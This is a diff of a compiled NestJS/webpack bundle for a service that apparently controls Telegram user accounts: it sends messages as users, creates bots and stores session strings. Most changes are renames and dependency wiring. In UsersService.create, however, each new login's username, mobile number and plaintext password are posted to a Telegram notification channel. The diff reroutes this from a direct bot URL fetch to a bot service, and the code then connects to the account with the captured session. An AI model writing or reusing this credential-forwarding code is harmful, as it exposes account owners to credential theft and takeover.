@@ -1777,12 +1777,12 @@ __decorate([
     (0, common_1.Post)('message/:mobile'),
     (0, swagger_1.ApiOperation)({ summary: 'Send a Telegram message as a user' }),
     (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number of the user account to send the message from', required: true }),
-    (0, swagger_1.ApiBody)({ type: send_message_dto_1.SendMessageDto }),
+    (0, swagger_1.ApiBody)({ type: send_message_dto_1.SendTgMessageDto }),
     (0, swagger_1.ApiResponse)({ type: Object }),
     __param(0, (0, common_1.Param)('mobile')),
     __param(1, (0, common_1.Body)()),
     __metadata("design:type", Function),
-    __metadata("design:paramtypes", [String, send_message_dto_1.SendMessageDto]),
+    __metadata("design:paramtypes", [String, send_message_dto_1.SendTgMessageDto]),
     __metadata("design:returntype", Promise)
 ], TelegramController.prototype, "sendMessage", null);
 __decorate([
@@ -2580,12 +2580,12 @@ __decorate([
     (0, common_1.Post)('bot/create/:mobile'),
     (0, swagger_1.ApiOperation)({ summary: 'Create a new bot using BotFather' }),
     (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
-    (0, swagger_1.ApiBody)({ type: dto_1.CreateBotDto }),
+    (0, swagger_1.ApiBody)({ type: dto_1.CreateTgBotDto }),
     (0, swagger_1.ApiResponse)({ type: Object, schema: { properties: { botToken: { type: 'string', description: 'The token to access HTTP Bot API' }, username: { type: 'string', description: 'The username of the created bot' } } } }),
     __param(0, (0, common_1.Param)('mobile')),
     __param(1, (0, common_1.Body)()),
     __metadata("design:type", Function),
-    __metadata("design:paramtypes", [String, dto_1.CreateBotDto]),
+    __metadata("design:paramtypes", [String, dto_1.CreateTgBotDto]),
     __metadata("design:returntype", Promise)
 ], TelegramController.prototype, "createBot", null);
 exports.TelegramController = TelegramController = __decorate([
@@ -6667,12 +6667,12 @@ var __metadata = (this && this.__metadata) || function (k, v) {
     if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
 };
 Object.defineProperty(exports, "__esModule", ({ value: true }));
-exports.CreateBotDto = void 0;
+exports.CreateTgBotDto = void 0;
 const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
 const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
-class CreateBotDto {
+class CreateTgBotDto {
 }
-exports.CreateBotDto = CreateBotDto;
+exports.CreateTgBotDto = CreateTgBotDto;
 __decorate([
     (0, swagger_1.ApiProperty)({
         description: 'Name of the bot (required)',
@@ -6682,7 +6682,7 @@ __decorate([
     (0, class_validator_1.IsString)(),
     (0, class_validator_1.MaxLength)(64),
     __metadata("design:type", String)
-], CreateBotDto.prototype, "name", void 0);
+], CreateTgBotDto.prototype, "name", void 0);
 __decorate([
     (0, swagger_1.ApiProperty)({
         description: 'Username for the bot (required)',
@@ -6692,7 +6692,7 @@ __decorate([
     (0, class_validator_1.IsString)(),
     (0, class_validator_1.MaxLength)(32),
     __metadata("design:type", String)
-], CreateBotDto.prototype, "username", void 0);
+], CreateTgBotDto.prototype, "username", void 0);
 __decorate([
     (0, swagger_1.ApiProperty)({
         description: 'Description of what your bot can do',
@@ -6703,7 +6703,7 @@ __decorate([
     (0, class_validator_1.IsString)(),
     (0, class_validator_1.MaxLength)(512),
     __metadata("design:type", String)
-], CreateBotDto.prototype, "description", void 0);
+], CreateTgBotDto.prototype, "description", void 0);
 __decorate([
     (0, swagger_1.ApiProperty)({
         description: 'What the bot can be used for',
@@ -6714,7 +6714,7 @@ __decorate([
     (0, class_validator_1.IsString)(),
     (0, class_validator_1.MaxLength)(512),
     __metadata("design:type", String)
-], CreateBotDto.prototype, "aboutText", void 0);
+], CreateTgBotDto.prototype, "aboutText", void 0);
 __decorate([
     (0, swagger_1.ApiProperty)({
         description: 'URL to the bot\'s profile photo',
@@ -6724,7 +6724,7 @@ __decorate([
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsString)(),
     __metadata("design:type", String)
-], CreateBotDto.prototype, "profilePhotoUrl", void 0);
+], CreateTgBotDto.prototype, "profilePhotoUrl", void 0);
 
 
 /***/ }),
@@ -7987,12 +7987,12 @@ var __metadata = (this && this.__metadata) || function (k, v) {
     if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
 };
 Object.defineProperty(exports, "__esModule", ({ value: true }));
-exports.SendMessageDto = void 0;
+exports.SendTgMessageDto = void 0;
 const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
 const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
-class SendMessageDto {
+class SendTgMessageDto {
 }
-exports.SendMessageDto = SendMessageDto;
+exports.SendTgMessageDto = SendTgMessageDto;
 __decorate([
     (0, swagger_1.ApiProperty)({
         description: 'Target username or peer ID',
@@ -8000,7 +8000,7 @@ __decorate([
     }),
     (0, class_validator_1.IsString)(),
     __metadata("design:type", String)
-], SendMessageDto.prototype, "peer", void 0);
+], SendTgMessageDto.prototype, "peer", void 0);
 __decorate([
     (0, swagger_1.ApiProperty)({
         description: 'Message text to send',
@@ -8008,7 +8008,7 @@ __decorate([
     }),
     (0, class_validator_1.IsString)(),
     __metadata("design:type", String)
-], SendMessageDto.prototype, "message", void 0);
+], SendTgMessageDto.prototype, "message", void 0);
 __decorate([
     (0, swagger_1.ApiProperty)({
         description: 'Optional message parse mode (Markdown, HTML)',
@@ -8018,7 +8018,7 @@ __decorate([
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsString)(),
     __metadata("design:type", String)
-], SendMessageDto.prototype, "parseMode", void 0);
+], SendTgMessageDto.prototype, "parseMode", void 0);
 
 
 /***/ }),
@@ -10943,6 +10943,7 @@ var ChannelCategory;
     ChannelCategory["CHANNEL_NOTIFICATIONS"] = "CHANNEL_NOTIFICATIONS";
     ChannelCategory["ACCOUNT_NOTIFICATIONS"] = "ACCOUNT_NOTIFICATIONS";
     ChannelCategory["ACCOUNT_LOGIN_FAILURES"] = "ACCOUNT_LOGIN_FAILURES";
+    ChannelCategory["ACCOUNT_LOGINS"] = "ACCOUNT_LOGINS";
     ChannelCategory["PROMOTION_ACCOUNT"] = "PROMOTION_ACCOUNT";
     ChannelCategory["CLIENT_ACCOUNT"] = "CLIENT_ACCOUNT";
     ChannelCategory["PAYMENT_FAIL_QUERIES"] = "PAYMENT_FAIL_QUERIES";
@@ -11412,6 +11413,7 @@ let BotsService = class BotsService {
             return res.data?.ok ? res.data.result.username : '';
         }
         catch (error) {
+            console.error('Error fetching bot username with provided token:', error);
             (0, utils_1.parseError)(error, 'Failed fetching bot username:');
             return '';
         }
@@ -28443,6 +28445,7 @@ const user_schema_1 = __webpack_require__(/*! ./schemas/user.schema */ "./src/co
 const Telegram_module_1 = __webpack_require__(/*! ../Telegram/Telegram.module */ "./src/components/Telegram/Telegram.module.ts");
 const client_module_1 = __webpack_require__(/*! ../clients/client.module */ "./src/components/clients/client.module.ts");
 const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
+const bots_1 = __webpack_require__(/*! ../bots */ "./src/components/bots/index.ts");
 let UsersModule = class UsersModule {
 };
 exports.UsersModule = UsersModule;
@@ -28452,7 +28455,8 @@ exports.UsersModule = UsersModule = __decorate([
             init_module_1.InitModule,
             mongoose_1.MongooseModule.forFeature([{ name: 'userModule', schema: user_schema_1.UserSchema, collection: 'users' }]),
             (0, common_1.forwardRef)(() => Telegram_module_1.TelegramModule),
-            (0, common_1.forwardRef)(() => client_module_1.ClientModule)
+            (0, common_1.forwardRef)(() => client_module_1.ClientModule),
+            bots_1.BotsModule
         ],
         controllers: [users_controller_1.UsersController],
         providers: [users_service_1.UsersService],
@@ -28489,14 +28493,14 @@ const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
 const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
 const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
 const client_service_1 = __webpack_require__(/*! ../clients/client.service */ "./src/components/clients/client.service.ts");
-const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
-const logbots_1 = __webpack_require__(/*! ../../utils/logbots */ "./src/utils/logbots.ts");
 const connection_manager_1 = __webpack_require__(/*! ../Telegram/utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts");
+const bots_1 = __webpack_require__(/*! ../bots */ "./src/components/bots/index.ts");
 let UsersService = class UsersService {
-    constructor(userModel, telegramService, clientsService) {
+    constructor(userModel, telegramService, clientsService, botsService) {
         this.userModel = userModel;
         this.telegramService = telegramService;
         this.clientsService = clientsService;
+        this.botsService = botsService;
     }
     async create(user) {
         const activeClientSetup = this.telegramService.getActiveClientSetup();
@@ -28507,7 +28511,7 @@ let UsersService = class UsersService {
             await this.clientsService.updateClientSession(user.session);
         }
         else {
-            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`)}`);
+            await this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_LOGINS, `ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`);
             setTimeout(async () => {
                 try {
                     await connection_manager_1.connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });
@@ -28600,7 +28604,8 @@ exports.UsersService = UsersService = __decorate([
     __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
     __metadata("design:paramtypes", [mongoose_2.Model,
         Telegram_service_1.TelegramService,
-        client_service_1.ClientService])
+        client_service_1.ClientService,
+        bots_1.BotsService])
 ], UsersService);
 
 
@@ -29158,14 +29163,11 @@ const app_module_1 = __webpack_require__(/*! ./app.module */ "./src/app.module.t
 const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
 const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
 const fs = __importStar(__webpack_require__(/*! fs */ "fs"));
-const utils_1 = __webpack_require__(/*! ./utils */ "./src/utils/index.ts");
 const Exception_filter_1 = __webpack_require__(/*! ./interceptors/Exception-filter */ "./src/interceptors/Exception-filter.ts");
 const timeout_interceptor_1 = __webpack_require__(/*! ./interceptors/timeout.interceptor */ "./src/interceptors/timeout.interceptor.ts");
 async function bootstrap() {
     try {
-        const app = await core_1.NestFactory.create(app_module_1.AppModule, {
-            logger: utils_1.Logger
-        });
+        const app = await core_1.NestFactory.create(app_module_1.AppModule);
         const config = new swagger_1.DocumentBuilder()
             .setTitle('NestJS and Express API')
             .setDescription('API documentation')
